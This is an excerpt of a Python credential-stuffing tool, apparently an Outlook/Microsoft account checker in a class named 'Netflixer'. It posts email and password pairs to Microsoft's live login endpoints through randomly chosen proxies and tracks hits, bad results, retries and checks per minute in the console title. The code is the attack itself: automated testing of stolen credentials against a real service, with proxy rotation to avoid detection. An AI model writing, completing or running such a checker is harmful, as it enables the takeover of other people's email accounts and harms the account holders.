...
class Netflixer:
    ...
    def updateTitle(self):
        while True:
            ...
            os.system(
                f"title [outlooker] - Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}"
            )
            time.sleep(0.4)
    ...
    def getauthURL(self):
        try:
            login = requests.get(
                "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=156&ct=1721760244&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26deeplink%3dowa%252f%26RpsCsrfState%3d9e75786c-9d47-438c-fe7c-4d4432fb8893&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c",
    ...
    def checker(self, email, password):
        try:
            ...
            req = client.post(
                "https://login.live.com/ppsecure/post.srf?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=F558E05A92E94735&opid=0CEB4B2218EFCFAC&bk=1721760245&uaid=52a79fb9e4294e82b0f129c7ff26b372&pid=0",
                headers=headers,
                data=data,
                proxies=random.choice(self.proxies),
                timeout=10,
